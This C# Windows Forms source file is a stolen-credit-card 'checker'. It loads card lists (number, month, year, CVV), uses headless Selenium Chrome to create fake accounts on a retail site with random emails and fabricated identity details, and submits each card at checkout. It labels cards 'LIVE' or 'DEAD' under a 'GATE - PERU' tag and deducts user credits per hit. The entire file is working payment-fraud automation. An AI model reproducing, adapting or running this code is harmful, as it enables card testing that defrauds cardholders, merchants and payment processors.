using Dominio;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System.Data;
using System.IO;
using System.Drawing.Imaging;
using System.Drawing;
using WMPLib;
using Keys = OpenQA.Selenium.Keys;

namespace Presentacion
{
    public partial class peru : Form
    {
        public peru()
        {
            InitializeComponent();
        }
        static string correo()
        {
            var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var Charsarr = new char[8];
            var random = new Random();

            for (int i = 0; i < Charsarr.Length; i++)
            {
                Charsarr[i] = characters[random.Next(characters.Length)];
            }

            var resultString = new String(Charsarr);
            return resultString;
        }

        string mm = "wemop57340@slvlog.com";
        string nn = "Hanksac Beth";
        string cn = "asAdeqw@dwfwe3";
        string pp = "asAdeqw@dwfwe3";
       
        IWebDriver driver;

        public static class global
        {
            public static string pauseon = "no";
            public static bool activa = false;

        }
        private void f()
        {
            this.dataGridView1.Rows.Remove(this.dataGridView1.Rows[0]);
        }
        private object Tarjetas()
        {
            throw new NotImplementedException();
        }
        private void nocharge_Load(object sender, EventArgs e)
        {

        }

        struct Datos
        {
            public string creditos;
        }
        private void btniniciar_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void btnpausa_Click(object sender, EventArgs e)
        {
            lblstatus.ForeColor = Color.Gold;
            lblstatus.Text = "Pausado";
            global.pauseon = "si";
            try
            {
                driver.Quit();
               
            }
            catch
            {

            }
        }


       
        private void btncargar_Click(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            try
            {
                // =========================================================
                char Separador;
                DataTable datagrid = new DataTable();
                DataRow dr;
                //==========================================================
                lblstatus.Text = "Cargadas correctamente!";
                lblstatus.ForeColor = Color.Gold;

                datagrid.Columns.Add("CC");
                datagrid.Columns.Add("MES");
                datagrid.Columns.Add("ANO");
                datagrid.Columns.Add("CVV");
                dr = datagrid.NewRow();
                //=============================================================
                System.IO.StreamReader Archivo = new System.IO.StreamReader(openFileDialog1.FileName);
                Separador = Convert.ToChar("|");
                while (Archivo.Peek() != -1)
                {
                    datagrid.Rows.Add(Archivo.ReadLine().Split(Separador));

                }
                dataGridView1.DataSource = datagrid;
                this.Tarjetas();
                dataGridView1.CurrentRow.Selected = true;
                // =============================================================
            }
            catch (Exception)
            {

            }
            this.tContador.Start();
            //ORGANIZADOR GRID
            int tmn;
            var loopTo = dataGridView1.ColumnCount - 1;
            for (tmn = 0; tmn <= loopTo - 1; tmn++)
            {
                if (tmn == dataGridView1.ColumnCount - 1)
                {
                    dataGridView1.Columns[tmn].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
                }
                else
                {
                    dataGridView1.Columns[tmn].AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells;
                }

            }
            lblContador.Visible = true;
        }

        private void tContador_Tick(object sender, EventArgs e)
        {
            int suma = 0;
            try
            {
                var loopTo = dataGridView1.RowCount - 1;
                for (int i = 0; i <= loopTo; i++)
                {
                    if (Convert.ToBoolean(dataGridView1.Rows[i].Cells[1].ColumnIndex))
                    {
                        suma += 1;
                    }

                }

                this.lblContador.Text = Convert.ToString(suma);
            }
            catch (Exception)
            {
                lblContador.Text = "0";
            }

            if ((lblContador.Text == "1"))
            {
                lblContador.Text = "0";
                this.tContador.Stop();
                lblstatus.Text = "Finalizado!";
                lblstatus.ForeColor = Color.Red;

            }
        }

        private void btnlimpiar_Click(object sender, EventArgs e)
        {
            try
            {
                driver.Close();

            }
            catch
            {

            }
            dataGridView1.DataSource = null;
            dataGridView1.Rows.Clear();
            dataGridView1.Refresh();
            lblstatus.ForeColor = Color.Gold;
            lblstatus.Text = "Cleaned";
            lives.Items.Clear();
            lblive.Text = "0";
            deads.Items.Clear();
            lbldead.Text = "0";
        }

        private void button1_Click(object sender, EventArgs e)
        {

            Thread t = new Thread(() => TareaSecundaria(lblstatus, deads, lives, dataGridView1));
            global.pauseon = "no";
            t.Start();
        }


        void TareaSecundaria(object statusLabelObject, object deads, object lives, object DatagridView)
        {

            var statusLabel = statusLabelObject as Label;
            if (statusLabel == null)
                throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");

            // Changes to controls must be performed on the UI thread.






            try
            {


                bool activa;


                if (lblContador.Text == "0")
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    activa = false;
                }
                else if (lblContador.Text == "1")
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    activa = false;
                }
                else if (Int32.Parse(lblContador.Text) > 300)
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"Demaciadas ccs!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    activa = false;
                }
                else if (Int32.Parse(cache.creditos) < 5)
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    activa = false;
                }
                else
                {
                    activa = true;

                }



                while (activa == true)
                {
                    if (global.pauseon == "si")
                    {
                        driver.Close();
                        activa = false;
                    }
                    try
                    {

                        driver.Close();
                    }
                    catch
                    {

                    }
                    int num = 1;
                    primer();
                    proceso();
                    while (num < 20)
                    {
                        num++;

                        if (global.pauseon == "si")
                        {
                            num = 20;
                            driver.Close();
                            activa = false;
                        }
                        if (lblContador.Text == "0")
                        {

                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            activa = false;
                        }
                        else if (lblContador.Text == "1")
                        {

                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            activa = false;
                        }
                        else if (Int32.Parse(lblContador.Text) > 300)
                        {
                            BeginInvoke((Action)(() => statusLabel.Text = @"Demaciadas ccs!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            activa = false;
                        }
                        else if (Int32.Parse(cache.creditos) < 5)
                        {

                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            activa = false;
                        }
                        else
                        {
                            if (activa == false)
                            {
                                BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            }
                            else
                            {
                                agregandocc();
                                pagando();
                                validar();
                            }


                        }
                        if (global.pauseon == "si")
                        {
                            driver.Close();
                            activa = false;
                        }
                    }
                    driver.Close();

                }


            }
            catch (IOException e)
            {
                string error = e.Message;
                //BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO X " + error));
                BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO X " ));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
              //  Thread.Sleep(30000);
                try
                {
                    
                    Thread.Sleep(2000);
                    try
                    {
                        if (global.pauseon == "si")
                        {
                            driver.Close();
                            return;
                        }
                        driver.Close();
                    }
                    catch (Exception)
                    {

                      
                    }
                    if (global.pauseon == "no")
                    {
                        Thread.Sleep(2000);
                        Thread t = new Thread(() => TareaSecundaria(lblstatus, deads, lives, dataGridView1));
                     global.pauseon = "no";
                        t.Start();
                    }

                }
                catch
                {

                }

            }





            void primer()
            {
                var statusLabel = statusLabelObject as Label;
                if (statusLabel == null)
                    throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");

                // Changes to controls must be performed on the UI thread.
                BeginInvoke((Action)(() => statusLabel.Text = @"Iniciando (1/6)"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));



                string path = Directory.GetCurrentDirectory();
                ChromeDriverService service = ChromeDriverService.CreateDefaultService(path, "chromedriver2.exe");
                service.HideCommandPromptWindow = true;
                ChromeOptions options = new ChromeOptions();
                options.AddArgument("--headless");
                options.AddArgument("no-sandbox");
                options.AddArgument("--disable-extensions");
                options.AddArgument("--disable-gpu");
                options.AddArgument("--disable-dev-shm-usage");
                options.AddArgument("--no-sandbox");
                options.AddArgument("--ignore-certificate-errors");
                options.AddArgument("--incognito");
                options.AddArgument("window-size=1400,1400");
                // options.AddArgument("--start-maximized");

                driver = new ChromeDriver(service, options);
                try { 
                


                    driver.Navigate().GoToUrl("https://www.gef.co/610000418-000999");
                    Thread.Sleep(6000);
                    IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                    driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
                    wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                    var Charsarr = new char[7];
                    var random = new Random();

                    for (int i = 0; i < Charsarr.Length; i++)
                    {
                        Charsarr[i] = characters[random.Next(characters.Length)];
                    }
                    var charactersnum = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                    var Charsarrnum = new char[5];
                    var randomnum = new Random();

                    for (int i = 0; i < Charsarrnum.Length; i++)
                    {
                        Charsarrnum[i] = charactersnum[randomnum.Next(charactersnum.Length)];
                    }
                    var correox = new String(Charsarr);
                    var correoxnum = new String(Charsarrnum);
                    var correo = correox + correoxnum;
                    Thread.Sleep(3000);
                    try
                    {
                        driver.FindElement(By.XPath("/html/body/div[7]/div/div/div/div[2]/button")).Click(); //anuncio
                        Thread.Sleep(1000);
                        driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div/button")).Click(); //boton agregar
                    }
                    catch (Exception ex)
                    {

                        driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div/button")).Click(); //boton agregar

                    }
                    
                    
                    Thread.Sleep(5000);
                    driver.Navigate().GoToUrl("https://www.gef.co/cart");
                    Thread.Sleep(3000);
                    wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                    try
                    {
                        driver.FindElement(By.XPath("/html/body/div[9]/div/div/div/div[2]/button")).Click();//anuncio
                        Thread.Sleep(3000);
                        driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[1]/div[2]/div[2]/div/div[2]/button")).Click(); //ir a pagar / registrar
                    }
                    catch (Exception ex)
                    {
                        Thread.Sleep(3000);
                        driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[1]/div[2]/div[2]/div/div[2]/button")).Click();

                    }
                    
                    Thread.Sleep(3000);
                    try
                    {
                        driver.FindElement(By.XPath("/html/body/div[9]/div/div/div/div[2]/button")).Click();//anuncio
                        //registrarse
                        try
                        {
                            driver.FindElement(By.XPath("/html/body/div[9]/div[3]/div/div[3]/button[1]")).Click();
                        }
                        catch (Exception)
                        {
                            driver.FindElement(By.XPath("/html/body/div[10]/div[3]/div/div[3]/button[1]")).Click();

                        }
                    }
                    catch (Exception ex)
                    { //registrarse
                        try
                        {
                            driver.FindElement(By.XPath("/html/body/div[9]/div[3]/div/div[3]/button[1]")).Click();
                        }
                        catch (Exception)
                        {
                            driver.FindElement(By.XPath("/html/body/div[10]/div[3]/div/div[3]/button[1]")).Click();

                        }

                    }
                    
                    Thread.Sleep(3000);
                    //registrando datos
                    wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                    BeginInvoke((Action)(() => statusLabel.Text = @"Registrando datos (2/6)"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[1]/div[1]/div/div/div[1]/div/input")).SendKeys(correo + "@gmail.com");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[1]/div[2]/div/div/div[1]/div/input")).SendKeys(correo + "@gmail.com");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[2]/div[1]/div[1]/div/input")).SendKeys("4rfv5tgb6yhn..");
                    Thread.Sleep(1000); 
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[2]/div[2]/div[1]/div/input")).SendKeys("4rfv5tgb6yhn..");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[3]/div[1]/div/div")).Click();
                    Thread.Sleep(1000);

                    try
                    {
                        driver.FindElement(By.XPath("/html/body/div[8]/div[3]/ul/li[2]")).Click(); //seleccionar cc
                    }
                    catch (Exception)
                    {

                        driver.FindElement(By.XPath("/html/body/div[9]/div[3]/ul/li[2]")).Click();
                    }
                   
                   
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[3]/div[2]/div/div/input")).SendKeys("20584730");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[4]/div[1]/div/div/input")).SendKeys("francisco");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[4]/div[2]/div/div/input")).SendKeys("penia");
                    Thread.Sleep(1000);
                    var characters2 = "0123456789";
                    var Charsarr2 = new char[7];
                    var random2 = new Random();

                    for (int i = 0; i < Charsarr.Length; i++)
                    {
                        Charsarr[i] = characters2[random.Next(characters2.Length)];
                    }

                    var num2 = new String(Charsarr);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[5]/div/div/div/input")).SendKeys(320+num2);
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[6]/div[1]/div/span/span[1]")).Click();
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[6]/div[2]/div/span/span[1]/input")).Click();
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[2]/div[2]/div/form/div[7]/button")).Click();
                   

                    if (global.pauseon == "si")
                    {
                        driver.Close();
                        return;
                    }
                    wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                    

                }
                catch (IOException e)
                {
                    string error = e.Message;
                    BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO 1 "));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));

                   // Thread.Sleep(30000);
                    try
                    {
                        global.pauseon = "si";
                        driver.Close();
                        
                    }
                    catch
                    {

                    }
                }
            }

            void proceso()
            {
                if (global.pauseon == "si")
                {
                    driver.Close();
                    return;
                }
                try { 
                Thread.Sleep(4000);
                var statusLabel = statusLabelObject as Label;
                if (statusLabel == null)
                throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");

                // Changes to controls must be performed on the UI thread.
                BeginInvoke((Action)(() => statusLabel.Text = @"Proceso... (3/6)"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                    
                    Thread.Sleep(5000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div[1]/div[2]/div[2]/div/div[2]/button")).Click(); //PAGAR
                    Thread.Sleep(3000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[2]/button")).Click(); //nueav direccion
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[3]/div/div[1]/div[2]/div[1]/div/input")).SendKeys("Carrera 100"); //agregando direccion
                    Thread.Sleep(5000);
                    try
                    {
                        driver.FindElement(By.XPath("///html/body/div[7]/div/div/div/div[2]/button")).Click(); //anuncio
                        Thread.Sleep(1000);
                        driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[3]/div/div[1]/div[2]/div[7]/div/div/div")).Click(); //departamento
                        Thread.Sleep(1000);
                    }
                    catch (Exception)
                    {
                        driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[3]/div/div[1]/div[2]/div[7]/div/div/div")).Click(); //departamento
                        Thread.Sleep(1000);

                    }
                    
                    try
                    {
                        driver.FindElement(By.XPath("///html/body/div[7]/div/div/div/div[2]/button")).Click(); //anuncio
                        Thread.Sleep(1000);
                        try
                        {
                            driver.FindElement(By.XPath("/html/body/div[9]/div[3]/ul/li[6]")).Click(); //selecciona la direccion 
                        }
                        catch (Exception)
                        {

                            driver.FindElement(By.XPath("/html/body/div[10]/div[3]/ul/li[6]")).Click();
                        }
                    }
                    catch (Exception)
                    {
                        try
                        {
                            driver.FindElement(By.XPath("/html/body/div[9]/div[3]/ul/li[6]")).Click(); //selecciona la direccion 
                        }
                        catch (Exception)
                        {

                            driver.FindElement(By.XPath("/html/body/div[10]/div[3]/ul/li[6]")).Click();
                        }

                    }
                   
                    
                    Thread.Sleep(1000);
                    try
                    {
                        driver.FindElement(By.XPath("///html/body/div[7]/div/div/div/div[2]/button")).Click(); //anuncio
                        Thread.Sleep(1000);
                        driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[3]/div/div[1]/div[2]/div[8]/div/div/div")).Click(); //selecciona la municipio
                        Thread.Sleep(1000);
                    }
                    catch (Exception)
                    {
                        driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[3]/div/div[1]/div[2]/div[8]/div/div/div")).Click(); //selecciona la municipio
                        Thread.Sleep(1000);

                    }
                    
                    try
                    {
                        driver.FindElement(By.XPath("/html/body/div[9]/div[3]/ul/li[2]")).Click(); //selecciona la direccion /html/body/div[10]/div[3]/ul/li[2]
                    }
                    catch (Exception)
                    {

                        driver.FindElement(By.XPath("/html/body/div[10]/div[3]/ul/li[2]")).Click(); //selecciona la direccion 
                    }
                    
                    Thread.Sleep(1000);
                    IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                    js.ExecuteScript("javascript:window.scrollBy(250,350)");
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[3]/div/div[1]/div[2]/div[9]/input")).SendKeys("Carrera 100");
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[3]/div/div[1]/div[2]/div[9]/input")).SendKeys(Keys.Space);
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[3]/div/div[1]/div[2]/div[9]/input")).SendKeys(Keys.ArrowDown + Keys.Enter);
                    Thread.Sleep(2000);
                    
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[3]/div/div[2]/div[2]/button")).Click(); //agregar direccion completa
                    Thread.Sleep(6000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[4]/div/button")).Click();
                    Thread.Sleep(8000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[2]/div/div/fieldset/div[2]/div[1]/label/span[1]/span[1]/input")).Click();
                    // Thread.Sleep(400000);
                    Thread.Sleep(8000);
                  
                    js.ExecuteScript("javascript:window.scrollBy(250,350)");
                    Thread.Sleep(1000);
                    js.ExecuteScript("javascript:window.scrollBy(250,350)");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[2]/div[2]/div/div/fieldset/div[2]/div[1]/div/div/div[2]/div[2]/form/div[1]/div[8]/label/span[1]/span[1]")).Click(); //guardar tarjeta

                }
                catch (IOException e)
                {
                   
                    BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO 2"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    //Thread.Sleep(30000);
                    try
                    {
                        global.pauseon = "si";
                        driver.Close();

                    }
                    catch
                    {

                    }
                }
            }


            void agregandocc()
            {
                if (global.pauseon == "si")
                {
                    driver.Close();
                    return;
                }
                var statusLabel = statusLabelObject as Label;
                if (statusLabel == null)
                    throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");

                // Changes to controls must be performed on the UI thread.
                BeginInvoke((Action)(() => statusLabel.Text = @"Agregando cc (4/6)"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));

                string cc = dataGridView1.CurrentRow.Cells[0].Value.ToString().TrimEnd();
                string month = dataGridView1.CurrentRow.Cells[1].Value.ToString().TrimEnd();
                string year = dataGridView1.CurrentRow.Cells[2].Value.ToString().TrimEnd();
                string cvv = dataGridView1.CurrentRow.Cells[3].Value.ToString().TrimEnd();
               

                try
                {
                    Thread.Sleep(3000);

                    IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                    wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));


                   // driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='braintree-hosted-field-number']")));
                    BeginInvoke((Action)(() => statusLabel.Text = @cc));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Yellow));
                    driver.FindElement(By.XPath("//*[@id='cardNumber']")).SendKeys(Keys.Control + "a");
                    driver.FindElement(By.XPath("//*[@id='cardNumber']")).SendKeys(cc);
                    // driver.SwitchTo().DefaultContent();
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("//*[@id='cardholderName']")).SendKeys(Keys.Control + "a");
                    driver.FindElement(By.XPath("//*[@id='cardholderName']")).SendKeys("Daniela Castillo");
                    Thread.Sleep(2000);
                    var mont = driver.FindElement(By.Id("cardExpirationMonth"));
                    //create select element object 
                    var selectElement = new SelectElement(mont);
                    //select by value
                    selectElement.SelectByValue(month);
                    // select by text
                    // selectElement.SelectByText("HighSchool");
                    ///año
                   Thread.Sleep(2000);
                    var yer = driver.FindElement(By.Id("cardExpirationYear"));
                    //create select element object 
                    var selectElement2 = new SelectElement(yer);
                    //select by value
                    selectElement2.SelectByValue(year);



                    /////aca continua
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("//*[@id='securityCode']")).SendKeys(Keys.Control + "a");
                    driver.FindElement(By.XPath("//*[@id='securityCode']")).SendKeys(cvv);
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("//*[@id='docNumber']")).SendKeys(Keys.Control + "a");
                    driver.FindElement(By.XPath("//*[@id='docNumber']")).SendKeys("20584730");
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("//*[@id='phoneNumber']")).SendKeys(Keys.Control + "a");
                    driver.FindElement(By.XPath("//*[@id='phoneNumber']")).SendKeys("3208524050");

                    Thread.Sleep(1000);



                }
                catch
                {
                    Thread.Sleep(3000);

                   // IWait<IWebDriver> waiit = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                   // waiit.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                    agregandocc();
                }



            }

           

            void pagando()
            {
                if (global.pauseon == "si")
                {
                    driver.Close();
                    return;
                }
                try { 
                var statusLabel = statusLabelObject as Label;
                if (statusLabel == null)
                    throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");

                // Changes to controls must be performed on the UI thread.
                BeginInvoke((Action)(() => statusLabel.Text = @"Pagando (5/6)"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                Thread.Sleep(1000);
                IWait<IWebDriver> waiit = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                waiit.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                    Thread.Sleep(1000);
                    try
                    {
                        driver.FindElement(By.XPath("/html/body/div[7]/div/div/div/div[2]/button")).Click(); //anuncio
                        Thread.Sleep(1000);
                        driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[3]/div[2]/div/div/button")).Click(); //pagando
                        Thread.Sleep(1000);
                    }
                    catch (Exception)
                    {
                        Thread.Sleep(1000);
                        driver.FindElement(By.XPath("/html/body/div[3]/div/div/div[2]/div/div/div[2]/div/div[3]/div[2]/div/div/button")).Click(); //pagando

                    }
                    
                
                Thread.Sleep(5000);
                waiit.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                   
                }
                catch
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));

                    try
                    {
                        if (global.pauseon == "si")
                        {
                            driver.Close();
                            return;
                        }
                        driver.Close();

                    }
                    catch
                    {

                    }
                }

            }


            void validar()
            {
                if (global.pauseon == "si")
                {
                    driver.Close();
                    return;
                }
                try { 
                var statusLabel = statusLabelObject as Label;
                var livess = lives as ListBox;
                var deadss = deads as ListBox;
                var dataGridView1 = DatagridView as DataGridView;
                if (statusLabel == null)
                    throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");

                Thread.Sleep(4000);
                // Changes to controls must be performed on the UI thread.
                BeginInvoke((Action)(() => statusLabel.Text = @"Validando (6/6)"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
                Thread.Sleep(4000);
                string cc = dataGridView1.CurrentRow.Cells[0].Value.ToString().TrimEnd();
                string month = dataGridView1.CurrentRow.Cells[1].Value.ToString().TrimEnd();
                string year = dataGridView1.CurrentRow.Cells[2].Value.ToString().TrimEnd();
                string cvv = dataGridView1.CurrentRow.Cells[3].Value.ToString().TrimEnd();
                    
                    if (driver.PageSource.Contains("Ocurrió un error al procesar su pago, por favor intente nuevamente"))
                {

                    BeginInvoke((Action)(() => deadss.Items.Add("✘ DEAD [GATE - PERU] - " + cc + " | " + month + " | " + year + " | " + cvv + " - [Golpe De Estado]")));
                    BeginInvoke((Action)(() => statusLabel.Text = @"✘ DEAD ✘"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Red));
                    BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1])); BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1]));
                    BeginInvoke((Action)(() => dataGridView1.Rows.RemoveAt(dataGridView1.CurrentRow.Index)));
                    //eliminando();

                }
                    
                else if (driver.PageSource.Contains("Resumen del pedido")|| driver.PageSource.Contains("Información de Pago"))
                {

                    datos delete = new datos();
                    var eliminar = delete.Discount(cache.user);
                    cache.creditos = eliminar;
                    //eliminar = creditos.Text;
                    WindowsMediaPlayer musica;
                    musica = new WindowsMediaPlayer();
                    musica.URL = Application.StartupPath + @"\driver\live.mp3";
                    musica.controls.play();
                    datos bin = new datos();
                    string tarjt = cc + "|" + month + "|" + year + "|" + cvv;
                    var binlookup = delete.bin(cache.user, tarjt, "PERU");
                    BeginInvoke((Action)(() => statusLabel.Text = @"✔ LIVE ✔"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Green));
                    BeginInvoke((Action)(() => livess.Items.Add("✔ LIVE [GATE - PERU] - " + cc + " | " + month + " | " + year + " | " + cvv + "✔ - [Golpe De Estado] - [" + binlookup + "]")));

                    BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1])); BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1]));
                    BeginInvoke((Action)(() => dataGridView1.Rows.RemoveAt(dataGridView1.CurrentRow.Index)));
                    BeginInvoke((Action)(() => statusLabel.Text = @eliminar));
                    driver.Close();
                    primer();
                    proceso();


                }
                else
                {
                    revalid();

                }

                }
                catch
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    try
                    {
                        if (global.pauseon == "si")
                        {
                            driver.Close();
                            return;
                        }
                        driver.Close();
                    }
                    catch
                    {

                    }
                }

            }

            void revalid()
            {
                validar();
            }

           

        }

        private void lives_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control == true && e.KeyCode == System.Windows.Forms.Keys.C)
            {
                string s = lives.SelectedItem.ToString();
                Clipboard.SetData(DataFormats.StringFormat, s);
            }
        }


    }
}
